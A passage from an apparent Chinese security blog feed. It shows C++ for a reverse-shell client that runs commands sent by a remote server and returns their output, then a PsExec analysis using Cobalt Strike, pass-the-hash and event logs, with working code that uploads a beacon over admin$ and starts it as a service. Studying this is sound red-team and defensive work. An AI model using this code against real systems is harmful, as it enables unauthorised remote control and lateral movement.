class="hljs-built_in">htons</span>(ServerPort);<br>    ServerAddr.sin_addr.S_un.S_addr = ::<span class="hljs-built_in">inet_addr</span>(ServerIP);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] connect ...\n&quot;</span>;<br>    <span class="hljs-comment">//建立连接</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">connect</span>(g_ClientSocket, (LPSOCKADDR)&amp;ServerAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ServerAddr))) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] connect Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>连接后就是负责接收服务端传输的数据,也就是dos命令,并执行,将执行后的结果返回服务端(这里先返回一个ok)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">SendRet</span><span class="hljs-params">(LPSTR pszSend)</span></span><br><span class="hljs-function"></span>&#123;<br>    ::<span class="hljs-built_in">send</span>(g_ClientSocket, pszSend, <span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend), <span class="hljs-literal">NULL</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] sent Bytes:&quot;</span> &lt;&lt; pszSend &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function">VOID <span class="hljs-title">RecvCommand</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-comment">//char szRetBuffer[11240] = &#123; 0 &#125;;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-comment">//接收数据</span><br>        <span class="hljs-keyword">int</span> ret = ::<span class="hljs-built_in">recv</span>(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//执行命令</span><br>        <span class="hljs-built_in">system</span>(szBuffer);<br>        <span class="hljs-built_in">SendRet</span>((LPSTR)<span class="hljs-string">&quot;ok&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里已经实现了可以循环执行命令,那么现在就是要把控制台输出数据传输回来。<br><img src="/img/socket/2.png"></p><p>这里把<code>system</code>函数替换掉,利用<code>CreatePipe</code>匿名管道一边读,一边写,再通过<code>CreateProcess</code>创建cmd进程执行命令,将返回的数据读进管道,再读出到缓存区,返回到服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hReadPipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hWritePipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 nSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateProcessA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR                lpApplicationName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSTR                 lpCommandLine,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  BOOL                  bInheritHandles,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 dwCreationFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPVOID                lpEnvironment,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR                lpCurrentDirectory,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">GetCmdData</span><span class="hljs-params">(LPSTR lpscmd, LPSTR lpsRetBuffer,DWORD RetBufferSize)</span></span><br><span class="hljs-function"></span>&#123;<br>    SECURITY_ATTRIBUTES sa;<br>    HANDLE hRead, hWrite;<br>    sa.bInheritHandle = TRUE;<br>    sa.nLength = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(sa);<br>    sa.lpSecurityDescriptor = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//创建匿名管道</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreatePipe</span>(&amp;hRead, &amp;hWrite, &amp;sa, <span class="hljs-number">0</span>)) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreatePipe Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置新进程参数</span><br>    STARTUPINFOA si = &#123;<span class="hljs-number">0</span>&#125;;<br>    PROCESS_INFORMATION pi = &#123;<span class="hljs-number">0</span>&#125;;<br>    si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>    si.hStdError = hWrite;<br>    si.hStdOutput = hWrite;<br>    si.wShowWindow = SW_HIDE;<br>    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;<br>    <span class="hljs-comment">//创建进程执行命令</span><br>    <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-literal">NULL</span>, lpscmd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;CreateProcess Failed..\n&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hWrite);<br>    <span class="hljs-comment">//等待命令执行结束</span><br>    ::<span class="hljs-built_in">WaitForSingleObject</span>(pi.hThread, INFINITE);<br>    ::<span class="hljs-built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);<br>    <span class="hljs-comment">//读取管道中的数据,即执行命令后的结果</span><br>    ::<span class="hljs-built_in">RtlZeroMemory</span>(lpsRetBuffer, RetBufferSize);<br>    <span class="hljs-keyword">if</span> (!::<span class="hljs-built_in">ReadFile</span>(hRead, lpsRetBuffer, <span class="hljs-number">10000</span>, &amp;RetBufferSize, <span class="hljs-literal">NULL</span>)) &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;ReadFile Failed..\n&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(hRead);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/socket/3.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>psexec原理分析</title>
    <link href="/2021/06/20/psexec/"/>
    <url>/2021/06/20/psexec/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参加某行动时通过psexec横向过几台主机,正好之前在网上看到很多大佬分析过这款工具,今天也自己动手重新分析一次<br>因为很大程度上是学着大佬分析思路来分析的,所以先把参考写在前面:<br><a href="https://payloads.online/archivers/2020-04-02/1">https://payloads.online/archivers/2020-04-02/1</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108455478">https://blog.csdn.net/qq_41874930/article/details/108455478</a></p><h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h2><p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。<br>psexec工具下载地址:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a><br>cs也直接集成了这款工具</p><p><img src="/img/psexec/1.png"></p><h2 id="Psexec原理分析"><a href="#Psexec原理分析" class="headerlink" title="Psexec原理分析"></a>Psexec原理分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>win10  ip：192.168.154.7</li><li>win server 2008  X64 192.168.154.31</li></ul><p>假设已经得到win10主机的system权限<br>在cs上通过psexec64来横向win2008</p><p><img src="/img/psexec/2.png"></p><p>这里看到是需要账户和密码的,但是在内网环境中很多密码都是批量设置的,也就是说通过已经拿到的win10的hash去尝试登录内网其他主机<br>可以看到win2008直接上线,并且是system权限</p><p><img src="/img/psexec/3.png"></p><p>看一下win2008的安全日志</p><p><img src="/img/psexec/4.png"></p><p>看到有多个安全日志的产生<br>在事件4624中,看到了win10的ip,也就是申请管理的ip</p><p><img src="/img/psexec/5.png"></p><p>采用的NTMLv2协议,所以即便不知道明文,有hash值就可以转递</p><p><img src="/img/psexec/6.png"></p><p>再看系统日志</p><p><img src="/img/psexec/7.png"></p><p>ADMIN$这个是ipc共享中的默认共享,通常指向C:\Windows</p><p><img src="/img/psexec/8.png"></p><p>猜想就是通过这个exe上线<br><img src="/img/psexec/9.png"></p><p>这里肯定是与直接在win10上通过Psexec管理win2008的流程是不一样的,cs上执行主要目的还是反弹shell到cs上</p><p>大致流程为:</p><ol><li><p>登陆远程主机   事件ID4624</p></li><li><p>连接admin$共享   事件ID7045</p></li><li><p>写入xxxx.exe文件到共享目录下也就是c:\windows下</p></li><li><p>执行xxxx.exe,随即上线</p></li></ol><p>通过wireshark网络分析<br>直接在win10上通过psexec管理win2008</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\PsExec.exe</span> <span class="hljs-string">\\192.168.154.31</span> -u administrator -p <span class="hljs-number">123456</span> cmd<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/10.png"></p><p><img src="/img/psexec/11.png"></p><p>设置过滤规则</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">src</span>==192.168.154.31 <span class="hljs-keyword">or</span> ip.<span class="hljs-attribute">dst</span>==192.168.154.31<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/12.png"></p><ol><li><p>先进行TCP三次握手</p></li><li><p>协商协议</p></li><li><p>进行NTML验证</p></li><li><p>尝试连接$IPC</p></li><li><p>尝试连接ADMIN$</p></li><li><p>尝试写入PSEXESVC.exe</p></li></ol><p><img src="/img/psexec/13.png"></p><p>后续TCP数据包的内容,4D5A,标准的pe文件</p><p><img src="/img/psexec/14.png"></p><p>文件写入完毕后,执行API安装服务</p><p><img src="/img/psexec/15.png"></p><p>服务启动后会建立一个管道</p><p><img src="/img/psexec/16.png"></p><p>实际上一共创建了4个管道</p><p><img src="/img/psexec/17.png"></p><p><img src="/img/psexec/18.png"></p><p>整体流程跟从被连接主机的事件看到的流程基本一致。基本都是ntlm认证、连接共享目录admin$、写文件psexesvc到共享目录、调用svcctl服务来间接调用psexesvc服务、创建四个命名管道。</p><h2 id="实现psexec"><a href="#实现psexec" class="headerlink" title="实现psexec"></a>实现psexec</h2><h3 id="一-与目标主机建立SMB连接"><a href="#一-与目标主机建立SMB连接" class="headerlink" title="一.与目标主机建立SMB连接"></a>一.与目标主机建立SMB连接</h3><p>WNetAddConnection2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">WNetAddConnection2W</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPNETRESOURCEW lpNetResource,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR        lpPassword,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR        lpUserName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD          dwFlags</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>这里有例子:<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">ConnectSMBServer</span><span class="hljs-params">(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 用于存放SMB共享资源格式</span><br>    PWCHAR lpwsIPC = <span class="hljs-keyword">new</span> WCHAR[MAX_PATH];<br>    DWORD dwRetVal; <span class="hljs-comment">// 函数返回值</span><br>    NETRESOURCE nr; <span class="hljs-comment">// 连接的详细信息</span><br>    DWORD dwFlags; <span class="hljs-comment">// 连接选项</span><br><br>    <span class="hljs-built_in">ZeroMemory</span>(&amp;nr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(NETRESOURCE));<br>    <span class="hljs-built_in">swprintf</span>(lpwsIPC, MAX_PATH, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;\%s\admin$&quot;</span>), lpwsHost);<br>    nr.dwType = RESOURCETYPE_ANY; <span class="hljs-comment">// 枚举所有资源</span><br>    nr.lpLocalName = <span class="hljs-literal">NULL</span>;<br>    nr.lpRemoteName = lpwsIPC; <span class="hljs-comment">// 资源的网络名</span><br>    nr.lpProvider = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。</span><br>    dwFlags = CONNECT_UPDATE_PROFILE;<br>    dwRetVal = <span class="hljs-built_in">WNetAddConnection2</span>(&amp;nr, lpwsPassword, lpwsUserName, dwFlags);<br>    <span class="hljs-keyword">if</span> (dwRetVal == NO_ERROR) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection added to %s\n&quot;</span>, nr.lpRemoteName);<br>        <span class="hljs-keyword">return</span> dwRetVal;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WNetAddConnection2 failed with error: %d\n&quot;</span>, dwRetVal);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二-上传文件到目标主机"><a href="#二-上传文件到目标主机" class="headerlink" title="二.上传文件到目标主机"></a>二.上传文件到目标主机</h3><p>将现有文件拷贝到新文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CopyFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCTSTR lpExistingFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCTSTR lpNewFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  BOOL    bFailIfExists</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">UploadFileBySMB</span><span class="hljs-params">(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD dwRetVal;<br>    dwRetVal = <span class="hljs-built_in">CopyFile</span>(lpwsSrcPath, lpwsDstPath, FALSE);<br>    <span class="hljs-keyword">return</span> dwRetVal &gt; <span class="hljs-number">0</span> ? TRUE : FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三-开启服务"><a href="#三-开启服务" class="headerlink" title="三.开启服务"></a>三.开启服务</h3><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SC_HANDLE <span class="hljs-title">OpenSCManagerA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpMachineName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpDatabaseName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  dwDesiredAccess</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SC_HANDLE <span class="hljs-title">CreateServiceW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  SC_HANDLE hSCManager,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpServiceName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpDisplayName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwDesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwServiceType,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwStartType,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwErrorControl,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpBinaryPathName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpLoadOrderGroup,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD   lpdwTagId,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpDependencies,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpServiceStartName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpPassword</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>先使用<code>OpenSCManager</code>在目标机器上建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</p><p>然后用<code>CreateService</code>创建一个服务,再通过<code>OpenService</code>,<code>StartService</code>打开并开启服务</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateServices</span><span class="hljs-params">(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L&quot;Will Create Service %s\n&quot;</span> ,lpwsServiceName);<br>    SC_HANDLE hSCM;<br>    SC_HANDLE hService;<br>    SERVICE_STATUS ss;<br>    hSCM = <span class="hljs-built_in">OpenSCManager</span>(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);<br>    <span class="hljs-keyword">if</span> (hSCM == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenSCManager Error: %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    hService = <span class="hljs-built_in">CreateService</span>(<br>        hSCM, <span class="hljs-comment">// 服务控制管理器数据库的句柄</span><br>        lpwsServiceName, <span class="hljs-comment">// 要安装的服务的名称</span><br>        lpwsServiceName, <span class="hljs-comment">// 用户界面程序用来标识服务的显示名称</span><br>        GENERIC_ALL, <span class="hljs-comment">// 访问权限</span><br>        SERVICE_WIN32_OWN_PROCESS, <span class="hljs-comment">// 与一个或多个其他服务共享一个流程的服务</span><br>        SERVICE_DEMAND_START, <span class="hljs-comment">// 当进程调用StartService函数时，由服务控制管理器启动的服务 。</span><br>        SERVICE_ERROR_IGNORE, <span class="hljs-comment">// 启动程序将忽略该错误并继续启动操作</span><br>        lpwsServicePath, <span class="hljs-comment">// 服务二进制文件的标准路径</span><br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hService == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateService Error: %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L&quot;Create Service Success : %s\n&quot;</span>,lpwsServicePath);<br>    hService = <span class="hljs-built_in">OpenService</span>(hSCM, lpwsServiceName, GENERIC_ALL);<br>    <span class="hljs-keyword">if</span> (hService == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenService Error: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenService Success: %d!\n&quot;</span>);<br>    <span class="hljs-built_in">StartService</span>(hService, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我生成一个cs的马,改名为sd</p><p><img src="/img/psexec/19.png"></p><p>win2008</p><p><img src="/img/psexec/20.png"></p><p>但是以这种方式运行服务的话一会儿就会掉,随即cs掉线</p><p><img src="/img/psexec/21.png"></p><p>打开系统日志查看</p><p><img src="/img/psexec/22.png"></p><p>我的理解是:要创建一个服务的话这个服务得是满足windows服务规定的格式,而不是随便一个pe文件都可以充当服务</p><h2 id="编写服务程序"><a href="#编写服务程序" class="headerlink" title="编写服务程序"></a>编写服务程序</h2><h3 id="服务介绍"><a href="#服务介绍" class="headerlink" title="服务介绍"></a>服务介绍</h3><p>   几乎所有的操作系统在启动的时候都会启动一些不需要与用户交互的进程，这些进程在Windows中就被称作服务。它通常用于实现客户／服务器模式中的服务器方，如我们常见的Ｗeb服务IIS，当操作系统在启动后它就自动被运行，不管是否有人登陆到系统只要系统开启它就能得到运行。<br>    服务程序、服务控制程序（SCP，service control program）和服务控制管理器（SCM，service control manager）组成了Windows服务。我们可以通过服务控制程序操纵服务控制管理器来配置、启动、暂停、停止服务程序。其中服务程序和服务控制程序可以由我们自己来编写扩展，而服务控制管理器（windowssystem32servics.exe）则是操作系统内置的一个部件。<br>    SCM本身也是一个服务程序（windowssystem32servics.exe），作为windows的后台服务运行的。Winlogon在系统引导的早期会将SCM启动起来。</p><p>可以看一下这篇文章,写的比较详细<br><a href="https://blog.csdn.net/swartz_lubel/article/details/70255686">https://blog.csdn.net/swartz_lubel/article/details/70255686</a></p><p>倾旋博客中也已经给出了一个编写windwos服务的模板<br>还有几篇介绍windows服务编写的:<br> <a 